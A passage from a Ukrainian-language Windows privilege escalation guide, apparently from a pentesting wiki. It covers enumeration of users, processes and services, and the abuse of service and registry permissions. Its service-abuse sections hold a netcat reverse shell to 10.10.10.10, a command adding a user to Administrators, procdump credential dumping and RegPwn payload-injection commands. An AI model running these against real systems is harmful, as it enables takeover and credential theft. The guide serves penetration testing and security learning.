msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб використати цю вразливість, можна скористатися: _exploit/windows/local/always_install_elevated_

## Антивіруси та засоби виявлення

### Налаштування аудиту

Ці налаштування визначають, що саме **записується до журналу**, тож на них варто звернути увагу

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: цікаво знати, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначений для **керування паролями локального Administrator**, гарантуючи, що на комп’ютерах, приєднаних до домену, кожен пароль **унікальний, випадковий і регулярно оновлюється**. Ці паролі безпечно зберігаються в Active Directory, і доступ до них мають лише користувачі з достатніми дозволами через ACL, що дає їм змогу переглядати паролі локального адміністратора за наявності відповідних прав.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо активний, **паролі зберігаються в LSASS** (Local Security Authority Subsystem Service) у відкритому тексті.\
[**Докладніше про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Більше інформації про захист LSA тут**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** з’явився у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash. [**Докладніше про Credential Guard можна дізнатися тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Доменні облікові дані** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифікуються зареєстрованим пакетом безпеки, для цього користувача зазвичай створюються доменні облікові дані.\
[**Детальніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перелічити користувачів і групи

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **входите до привілейованої групи, можливо, ви зможете підвищити привілеї**. Дізнайтеся тут про привілейовані групи та способи зловживання ними для підвищення привілеїв:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляція токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві токени** та способи зловживання ними:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Увійшли користувачі / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримати вміст буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Перш за все, під час перегляду списку процесів **перевірте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати запущений бінарний файл** або чи маєте права на запис до папки з бінарним файлом, щоб скористатися можливими [**атаками DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers**: ними можна скористатися для підвищення привілеїв](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

debugger може бути доступний лише короткий час, тому його відсутність під час одного пасивного знімка портів не доводить, що він ніколи не був доступний. Зіставляйте виявлений listener із його PID, власником процесу та можливістю користувача з нижчими привілеями підключитися до нього; сама назва програми або прапорець налагодження не підтверджують можливість виконання коду від імені іншого користувача. Під час звичайного переліку залишайтеся пасивними й не надсилайте команди debugger.

**Перевірка дозволів на бінарні файли процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів для папок із бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги динамічних препроцесорів Snort

Snort 2 може завантажувати спільні бібліотеки з каталогу `dynamicpreprocessor directory`, зазначеного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Якщо заплановане завдання або служба запускає Snort від імені іншого облікового запису, перевірте саме цю конфігурацію та ACL каталогу модулів. Якщо ваш токен дає змогу створювати там файли, цей шлях варто перевірити на можливість виконання коду під час наступного завантаження модулів цим завданням або службою. Перевірте ефективні привілеї облікового запису запуску, активну конфігурацію, сумісність модулів, а також обмеження заборони доступу чи спільного доступу; сама лише можливість запису в каталог не доводить можливості підвищення привілеїв. У [документації Snort щодо динамічних препроцесорів](https://www.snort.org/documents/dpx-readme) описано завантаження модулів під час виконання.

### Привілейована вебслужба з доступним для запису кореневим каталогом документів

Установлюючи Apache на Windows, порівняйте шлях до виконуваного файла служби та обліковий запис запуску зі значенням `DocumentRoot` в активному `httpd.conf`. Для типової конфігурації XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, часто це `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому каталозі, а Apache працює від імені `LocalSystem`, виконання коду на сервері може перетнути межу привілеїв хоста. Переконайтеся, що служба запущена, що обслуговуються файли саме з цього шляху та що обробник на стороні сервера виконує файли відповідного типу; можливість запису в кореневий каталог сама по собі доводить лише можливість створення файлів. Перевірте ACL, не створюючи тестового файла:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для стандартного встановлення WAMP служба може вказувати на версійний `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а конфігурація може міститися поруч, у `conf\httpd.conf`, зі стандартним кореневим каталогом `C:\wamp64\www` або `C:\wamp\www`. Перевірте разом точний образ служби, обліковий запис, від імені якого вона запускається, фактичний `DocumentRoot` (з урахуванням розгортання `${INSTALL_DIR}` і перевизначень віртуальних хостів) та ACL кореневого каталогу. Наявність прав на запис у каталог WAMP сама по собі не доводить, що Apache працює як `SYSTEM` або виконує надісланий файл. [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережева ідентичність пулу застосунків

Для IIS зіставте фізичний каталог, доступний для запису, з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте налаштований для нього пул і обробник на сервері. Код у каталозі, який обслуговується, запускається від імені пулу лише тоді, коли IIS обробляє файли цього типу, а маршрут доступний. Перш ніж вважати каталог, доступний для запису, можливістю виконання коду, перевірте ефективні права поточного користувача на створення файлів, стан сайту під час виконання, обробник і перевизначення для відповідного шляху.

Динамічна компіляція ASP.NET створює окремий шлях для перевірки: згенеровані файли в каталозі компіляції застосунку. Типовим є каталог `Temporary ASP.NET Files` у відповідному каталозі встановлення .NET Framework, але параметр `<compilation tempDirectory>` застосунку може змінити його. [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) та [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен менш привілейованого користувача дає змогу змінювати згенерований вихідний код у кеші **конкретного** застосунку, з’ясуйте, чи компілює цей застосунок його повторно з більш привілейованою [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Самі лише ACL файлу або каталогу не доводять можливість виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, ідентичністю процесу та часом будь-якої повторної компіляції. Використовуйте лише перевірку метаданих у режимі читання; під час переліку не запускайте компіляцію та не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай проходить автентифікацію в ресурсах домену як **обліковий запис комп’ютера-хоста**, навіть якщо його локальний токен має низький рівень привілеїв. `LocalSystem` уже має високі локальні привілеї й також використовує в мережі обліковий запис комп’ютера; `LocalService` зазвичай надає анонімні мережеві облікові дані. Пул `SpecificUser` використовує натомість налаштований для нього обліковий запис. [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) і [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не задано, можуть успадковуватися стандартні параметри пулу, які відрізняються в різних поколіннях IIS, тому визначте ефективну конфігурацію, а не вгадуйте за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю облікового запису комп’ютера, оцініть права доступу до каталогу саме цього комп’ютера. [DCSync](../active-directory-methodology/dcsync.md) потребує прав реплікації в контексті іменування домену; квиток облікового запису комп’ютера або роль хоста самі по собі не доводять наявність таких прав. Пасивний збір даних має обмежуватися перевіркою конфігурації та ACL — без завантаження файлу, мережевої автентифікації чи запиту квитків.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте, як значення з запиту проходить автентифікацію, розшифрування, перевірку та формування команди. Обробник, який конкатенує декодований токен у `ProcessStartInfo("cmd", "/c ...")`, може дозволити метасимволам оболонки змінити команду; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що ненадійний користувач справді може впливати на декодоване значення й звертатися до обробника, а потім визначте ефективну ідентичність пулу застосунків або ідентичність під час імперсоналізації, а також ідентичність дочірнього процесу. Рядок у доступному для читання вихідному коді, слухач на localhost або слабкість формату токена самі по собі не доводять можливість виконання привілейованих команд. Під час пасивного збору даних перевіряйте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес.

Для служби PHP у Windows шлях, контрольований запитом і переданий у [`include` or `require`](https://www.php.net/manual/en/function.include.php), може призвести до виконання PHP-файлу, доступного для запису користувачеві з нижчим рівнем привілеїв, від імені процесу-обробника. Переконайтеся, що запит може дійти до цього оператора, визначений шлях вказує на файл, який користувач з нижчим рівнем привілеїв може змінити, а процес-обробник — прочитати, що відповідні обмеження шляхів PHP дозволяють включення, а процес-обробник справді має вищі привілеї. Слухач на loopback-адресі або файл, доступний для запису, самі по собі не доводять наявність такого ланцюжка; під час пасивного збору даних перевіряйте вихідний код, ідентичність служби й ACL файлів, не викликаючи кінцеву точку.

### Пошук паролів у пам’яті

За допомогою **procdump** із sysinternals можна створити дамп пам’яті запущеного процесу. Служби на кшталт FTP зберігають **облікові дані у відкритому вигляді в пам’яті**; спробуйте створити дамп пам’яті та прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Незахищені GUI-програми

**Програми, що працюють від SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: «Довідка та підтримка Windows» (Windows + F1): знайдіть «командний рядок» і натисніть «Клацніть, щоб відкрити командний рядок».

### Імпорт файлів проєктів із підвищеними привілеями

Програма, яка автоматично відкриває проєкти з каталогу скидання, доступного для запису користувачам із нижчим рівнем привілеїв, перетинає межу довіри до вхідних даних від імені облікового запису імпортера. Перевірте **точний шлях, доступний для запису**, процес або завдання, що його відкриває, ефективну ідентичність і збірку парсера. [Історична проблема Ghidra під час відкриття/відновлення проєкту](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяла [політика вихідного SMB і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це зачіпка щодо розкриття облікових даних, а не негайний доступ адміністратора: отриману відповідь потрібно використати через окремий авторизований або вразливий шлях, а поточні збірки слід оцінювати з огляду на фактичний стан виправлень. Не відкривайте спеціально створений проєкт під час пасивної розвідки; перевірте процес імпорту та ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) для об’єкта Service Control Manager (SCM) відрізняється від прав на наявну службу. Успішний запит лише на читання [`OpenSCManager` для отримання доступу](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) із цим правом є приводом для перевірки, а не доказом того, що нову службу можна запустити. [`CreateService повертає дескриптор`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час її створення; повторне відкриття служби згодом виконує окрему перевірку доступу й може завершитися помилкою, навіть якщо можна було скористатися початковим дескриптором. Окремо перевірте ефективний локальний або віддалений токен, права, надані дескриптору, обліковий запис служби, політику запуску та шлях до виконуваного файла. Не створюйте й не запускайте службу під час пасивної розвідки.

Для віддаленого встановлення служби зіставте ці права SCM із спільним ресурсом на цільовому комп’ютері, доступним для запису **для того самого мережевого входу**, його базовим ACL NTFS і локальним шляхом до виконуваного файла, який може запустити обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо наявні незвично широкі права SCM і шлях для розміщення файла; адміністративний спільний ресурс не є обов’язковою умовою. Сам по собі доступ для запису до спільного ресурсу або самі лише права SCM на створення служби не доводять, що нову службу можна запустити з вищими привілеями.

Наявна служба може викликати допоміжний виконуваний файл під час запуску, зупинки або іншої події життєвого циклу, навіть якщо цього файла немає в її `ImagePath`. Якщо ім’я допоміжного файла шукається в каталозі, доступному для запису користувачам із нижчим рівнем привілеїв, а служба працює з вищими привілеями, відсутній файл може бути кандидатом на умовну підміну. Перевірте **фактичний код служби або задокументований виклик допоміжного файла**, визначений шлях до виконуваного файла та порядок пошуку, права на створення каталогів, ідентичність служби й доступний тригер життєвого циклу. Каталог служби, доступний для запису, або відсутній файл самі по собі не доводять, що служба завантажить цей файл; під час пасивної перевірки не запускайте й не зупиняйте службу.

Для наявної служби право [`SERVICE_START` дозволяє передавати аргументи в `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); воно відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим за право керування, перевірте код служби або задокументований інтерфейс. Якщо служба використовує аргумент, заданий викликачем, як шлях до журналу або експорту, перевірте ідентичність служби, точний ланцюжок передавання аргументу до операції запису, обмеження шляхів і дозволи на **створений файл**. Запис у захищений каталог може стати шляхом до підвищення привілеїв лише за наявності окремого привілейованого споживача або завантажувача, який приймає цей файл; самого лише доступного для запису журналу чи права запуску недостатньо. Під час пасивного інвентаризування не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ файл `nsclient.ini`, доступний для читання, є **приводом для перевірки конфігурації**: він може містити облікові дані для вебдоступу, а `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, слухач WEB і політику доступу, а також чи може автентифікована роль змінювати налаштування або скрипти. Для привілейованого виконання додатково потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), чинне право реєструвати чи змінювати команду та тригер, який запускає її від імені служби. Навіть до слухача, прив’язаного лише до loopback, може мати доступ локальний користувач, але самі лише шлях до файла, пароль або слухач не доводять наявності цих прав. Під час пасивної розвідки перевіряйте метадані й дозволи, не показуючи секретів і не викликаючи веб-API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації з безпеки вебдоступу та скриптів](https://nsclient.org/docs/setup/securing/) і [конфігурацію зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` дорівнює `nssm.exe`, перевірте фактичний обліковий запис запуску служби та значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає там дочірню програму](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), а `AppDirectory` — це налаштований робочий каталог. Перш ніж вважати дозволи обгортки повним описом межі безпеки служби, перевірте дочірній виконуваний файл і ACL його батьківських каталогів. Локальна кінцева точка WCF або SOAP, яку надає ця дочірня програма, є окремим приводом для перевірки: переконайтеся, що вона доступна користувачу з нижчим рівнем привілеїв, що конкретна операція приймає його дані та що дочірня програма служби виконує небезпечну операцію з вищими привілеями. Обліковий запис служби, URL кінцевої точки або шлях, доступний для запису, самі по собі не доводять можливості підвищення привілеїв; під час пасивної розвідки не викликайте операції служби.

Для власної операції WCF простежте, чи потрапляє рядок, контрольований викликачем, до будь-якого PowerShell runspace. [`Pipeline.Commands.AddScript додає текст скрипту`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke запускає конвеєр`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding з обліковими даними Windows для транспортного рівня`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але право викликати **саме цю** операцію та ефективну ідентичність runspace потрібно перевіряти окремо. Шлях від введених даних викликачем із нижчим рівнем привілеїв до `AddScript`, що виконується з вищими привілеями служби, є межею виконання коду; порт, що прослуховується, автентифікований клієнт або невикористовуваний метод у сторонній збірці самі по собі нічого не доводять. Під час розвідки статично перевірте розгорнуту службу, контракт, авторизацію та налаштування імперсонації, не викликаючи кінцеву точку.

Тригери служб дозволяють Windows запускати службу за певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати привілейовані служби, активуючи їхні тригери. Ознайомтеся з методами переліку й активації тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностики Visual Studio

Інсталяції Visual Studio з інструментами C/C++ можуть містити `VSStandardCollectorService150` — службу діагностики, налаштовану для роботи від імені `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) для перенаправлення скидання DACL служби використовували junction і гонку з посиланням диспетчера об’єктів. Для продемонстрованого підвищення привілеїв також були потрібні доступний шлях відновлення MSI через Visual Studio Setup WMI Provider і цільовий файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивної первинної перевірки подивіться обліковий запис і шлях до двійкового файла саме цієї служби, перевірте, чи існує шлях до компілятора Setup WMI, і визначте стан виправлень установленого компонента. Сам запис служби, версія продукту Visual Studio або файл компілятора окремо не доводять, що вузол вразливий. Для перевірки не потрібно запускати службу або виконувати відновлення.

Отримайте список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

За допомогою **sc** можна отримати інформацію про службу.

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевіряти необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть «Authenticated Users» змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Тут можна завантажити accesschk.exe для XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо ви отримуєте цю помилку (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Службу не вдалося запустити, оскільки її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._

Її можна ввімкнути за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Враховуйте, що для роботи служби upnphost потрібна служба SSDPSRV (для XP SP1)**

**Ще один спосіб обійти** цю проблему — виконати:

```
sc.exe config usosvc start= auto
```

### **Змінити шлях до бінарного файлу служби**

Якщо група «Автентифіковані користувачі» має **SERVICE_ALL_ACCESS** до служби, можна змінити виконуваний бінарний файл служби. Щоб змінити та виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапуск служби

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити за допомогою різних дозволів:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштувати бінарний файл служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати право власності та змінювати дозволи.
- **GENERIC_WRITE**: Надає успадковану можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також надає успадковану можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна використати _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або батьківську папку**, часто можна перехопити службу, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити бінарний файл, який запускає служба**, або чи маєте **дозволи на запис до папки**, де розміщено бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Ви можете отримати список усіх бінарних файлів, які запускають служби, за допомогою **wmic** (не в system32), а потім перевірити свої дозволи за допомогою **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файлу служби чи каталогу, у якому він міститься. Практична послідовність дій:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файлу за допомогою `sc qc <service_name>`.
2. Перевірте, чи доступний бінарний файл для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або коректний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи спрацювання тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачеві перезапустити її, перевірте, чи запускається вона автоматично під час завантаження, чи має дію у разі збою, яка повторно запускає її, або чи може застосунок, що її використовує, опосередковано запустити її.

### Дозволи на зміну реєстру служб

Перевірте, чи можете ви змінювати реєстр будь-якої служби.\
Ви можете **перевірити** свої **дозволи** на **реєстр** служби так:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Початкову перевірку дозволів було сформульовано так:

Потрібно перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, можна змінити виконуваний службою бінарний файл.

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи на запис до ключа реєстру певної служби. Самого запису ACL недостатньо, щоб підтвердити фактичний доступ: важливі заборонні записи, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об’єкта служби. Для ескалації також потрібне придатне для використання поле конфігурації служби, спосіб запустити службу та ідентичність служби з вищими привілеями. Див. документацію Microsoft про [права на ключі реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) і [довідник з прав доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Щоб змінити шлях до виконуваного бінарного файлу:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка із symlink у реєстрі для довільного запису значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для кожного користувача, які згодом копіюються процесом **SYSTEM** до ключа сеансу HKLM. **Гонка із символічним посиланням** у реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив **довільного запису значення** HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список установлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходів до захищеного робочого столу, і користувач може записувати до нього.

Сценарій зловживання (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке має бути записане процесом SYSTEM.
2. Запустіть копіювання на захищеному робочому столі (наприклад, викличте **LockWorkstation**), що запускає процес брокера AT.
3. **Виграйте гонку**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **registry link**, що веде до захищеного цільового ключа HKLM.
4. SYSTEM запише вибране зловмисником значення до перенаправленого шляху HKLM.

Отримавши можливість довільно записувати значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служб:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запускати звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** публічна реалізація експлойту **блокує робочу станцію** під час гонки.

Приклад інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл на реєстр, це означає, що **ви можете створювати підрозділи реєстру в ньому**. У випадку служб Windows цього **достатньо для виконання довільного коду:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Шляхи служб без лапок

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожен варіант шляху, що закінчується перед пробілом.

